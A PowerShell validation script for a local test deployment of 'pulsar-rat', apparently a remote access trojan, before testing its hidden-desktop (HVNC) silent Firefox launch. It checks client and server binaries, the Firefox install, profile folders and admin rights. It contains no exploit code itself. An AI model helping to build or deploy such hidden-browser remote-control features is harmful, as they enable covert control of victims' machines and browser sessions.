#!/usr/bin/env pwsh
<#
.SYNOPSIS
Validates Firefox HVNC silent launch deployment
.DESCRIPTION
Performs pre-test validation of deployment, Firefox installation, and HVNC infrastructure
#>

param(
    [string]$TestRoot = "C:\Users\chris\projects\development\pulsar-rat\TEST_DEPLOYMENT",
    [switch]$Verbose = $false
)

$ErrorActionPreference = "Continue"

# Colors
$ColorGreen = "Green"
$ColorRed = "Red"
$ColorYellow = "Yellow"
$ColorCyan = "Cyan"

function Test-Component {
    param([string]$Name, [string]$Path)
    if (Test-Path $Path) {
        $Item = Get-Item $Path
        $Size = if ($Item.PSIsContainer) { "(dir)" } else { "(" + [math]::Round($Item.Length / 1MB, 2) + " MB)" }
        Write-Host "  OK: $Name $Size" -ForegroundColor $ColorGreen
        return $true
    } else {
        Write-Host "  ERR: $Name - NOT FOUND" -ForegroundColor $ColorRed
        return $false
    }
}

Write-Host ""
Write-Host "============================================" -ForegroundColor $ColorCyan
Write-Host "Firefox HVNC - Deployment Validation" -ForegroundColor $ColorCyan
Write-Host "============================================" -ForegroundColor $ColorCyan
Write-Host ""

# Phase 1: Deployment structure
Write-Host "[1] Deployment Structure" -ForegroundColor $ColorYellow
Write-Host "────────────────────────" -ForegroundColor $ColorYellow

$AllOK = $true
$AllOK = (Test-Component "Client.exe" "$TestRoot\Client\Client.exe") -and $AllOK
$AllOK = (Test-Component "Pulsar.exe" "$TestRoot\Server\Pulsar.exe") -and $AllOK
$AllOK = (Test-Component "Client Libs" "$TestRoot\Client") -and $AllOK
$AllOK = (Test-Component "Server Libs" "$TestRoot\Server") -and $AllOK
$AllOK = (Test-Component "Logs Dir" "$TestRoot\Logs") -and $AllOK

Write-Host ""

# Phase 2: Firefox Installation
Write-Host "[2] Firefox Installation" -ForegroundColor $ColorYellow
Write-Host "────────────────────────" -ForegroundColor $ColorYellow

$FirefoxFound = $false
$FirefoxPath = ""

$Paths = @(
    "C:\Program Files\Mozilla Firefox\firefox.exe",
    "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
)

foreach ($path in $Paths) {
    if (Test-Path $path) {
        $Item = Get-Item $path
        $Version = $Item.VersionInfo.FileVersion
        Write-Host "  OK: Firefox found at $path" -ForegroundColor $ColorGreen
        Write-Host "       Version: $Version" -ForegroundColor $ColorGreen
        $FirefoxFound = $true
        $FirefoxPath = $path
        break
    }
}

if (-not $FirefoxFound) {
    Write-Host "  WARN: Firefox not found in standard locations" -ForegroundColor $ColorYellow
    Write-Host "       Checked: $($Paths -join ', ')" -ForegroundColor $ColorYellow
    $AllOK = $false
}

Write-Host ""

# Phase 3: Profile Detection
Write-Host "[3] Firefox Profile Detection" -ForegroundColor $ColorYellow
Write-Host "─────────────────────────────" -ForegroundColor $ColorYellow

$ProfilePath = "$env:APPDATA\Mozilla\Firefox"
if (Test-Path $ProfilePath) {
    $Profiles = @(Get-ChildItem -Path "$ProfilePath\Profiles" -Directory -ErrorAction SilentlyContinue)
    Write-Host "  OK: Profiles directory found" -ForegroundColor $ColorGreen
    Write-Host "       Profiles: $($Profiles.Count)" -ForegroundColor $ColorGreen
    if ($Profiles.Count -gt 0) {
        foreach ($Profile in $Profiles | Select-Object -First 3) {
            Write-Host "         - $($Profile.Name)" -ForegroundColor $ColorGreen
        }
    }
} else {
    Write-Host "  WARN: Firefox profiles not initialized yet" -ForegroundColor $ColorYellow
    Write-Host "       Will be created on first Firefox launch" -ForegroundColor $ColorYellow
}

Write-Host ""

# Phase 4: HVNC Requirements
Write-Host "[4] HVNC Requirements" -ForegroundColor $ColorYellow
Write-Host "─────────────────────" -ForegroundColor $ColorYellow

# Check for required DLLs
$ClientDlls = @("Pulsar.Common.dll", "MessagePack.dll")
$ServerDlls = @("Pulsar.Common.dll", "MessagePack.dll")

$ClientDllsOK = $true
foreach ($dll in $ClientDlls) {
    if (Test-Path "$TestRoot\Client\$dll") {
        Write-Host "  OK: Client DLL: $dll" -ForegroundColor $ColorGreen
    } else {
        Write-Host "  WARN: Client DLL missing: $dll" -ForegroundColor $ColorYellow
        $ClientDllsOK = $false
    }
}

$ServerDllsOK = $true
foreach ($dll in $ServerDlls) {
    if (Test-Path "$TestRoot\Server\$dll") {
        Write-Host "  OK: Server DLL: $dll" -ForegroundColor $ColorGreen
    } else {
        Write-Host "  WARN: Server DLL missing: $dll" -ForegroundColor $ColorYellow
        $ServerDllsOK = $false
    }
}

Write-Host ""

# Phase 5: Executable Validation
Write-Host "[5] Executable Validation" -ForegroundColor $ColorYellow
Write-Host "────────────────────────" -ForegroundColor $ColorYellow

try {
    $ClientExe = Get-Item "$TestRoot\Client\Client.exe"
    Write-Host "  OK: Client.exe found" -ForegroundColor $ColorGreen
    Write-Host "       Framework: .NET 4.8" -ForegroundColor $ColorGreen
    Write-Host "       Size: " + [math]::Round($ClientExe.Length / 1MB, 2) + " MB" -ForegroundColor $ColorGreen
} catch {
    Write-Host "  ERR: Client.exe validation failed" -ForegroundColor $ColorRed
    $AllOK = $false
}

try {
    $ServerExe = Get-Item "$TestRoot\Server\Pulsar.exe"
    Write-Host "  OK: Pulsar.exe found" -ForegroundColor $ColorGreen
    Write-Host "       Framework: .NET 9.0" -ForegroundColor $ColorGreen
    Write-Host "       Size: " + [math]::Round($ServerExe.Length / 1MB, 2) + " MB" -ForegroundColor $ColorGreen
} catch {
    Write-Host "  ERR: Pulsar.exe validation failed" -ForegroundColor $ColorRed
    $AllOK = $false
}

Write-Host ""

# Phase 6: System Requirements
Write-Host "[6] System Requirements" -ForegroundColor $ColorYellow
Write-Host "──────────────────────" -ForegroundColor $ColorYellow

# Check .NET Framework
$DotNetVersion = [System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription
Write-Host "  OK: Current .NET Runtime: $DotNetVersion" -ForegroundColor $ColorGreen

# Check OS
$OS = [System.Environment]::OSVersion
Write-Host "  OK: Operating System: $($OS.VersionString)" -ForegroundColor $ColorGreen

# Check if running as admin
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($IsAdmin) {
    Write-Host "  OK: Running as Administrator" -ForegroundColor $ColorGreen
} else {
    Write-Host "  WARN: Not running as Administrator" -ForegroundColor $ColorYellow
    Write-Host "       HVNC desktop creation may require admin privileges" -ForegroundColor $ColorYellow
}

Write-Host ""

# Summary
Write-Host "============================================" -ForegroundColor $ColorCyan
if ($AllOK -and $FirefoxFound) {
    Write-Host "VALIDATION COMPLETE - READY FOR TESTING" -ForegroundColor $ColorGreen
    Write-Host ""
    Write-Host "To begin testing:" -ForegroundColor $ColorCyan
    Write-Host ""
    Write-Host "  PowerShell Window 1:" -ForegroundColor $ColorYellow
    Write-Host "  & '$TestRoot\Server\Pulsar.exe'" -ForegroundColor $ColorCyan
    Write-Host ""
    Write-Host "  PowerShell Window 2:" -ForegroundColor $ColorYellow
    Write-Host "  & '$TestRoot\Client\Client.exe'" -ForegroundColor $ColorCyan
    Write-Host ""
    Write-Host "  Then in Pulsar GUI: HVNC Desktop > Start Process > Mozilla" -ForegroundColor $ColorCyan
    Write-Host ""
} else {
    Write-Host "VALIDATION INCOMPLETE" -ForegroundColor $ColorYellow
    Write-Host "Some issues detected - review above" -ForegroundColor $ColorYellow
    Write-Host ""
}
Write-Host "============================================" -ForegroundColor $ColorCyan
Write-Host ""
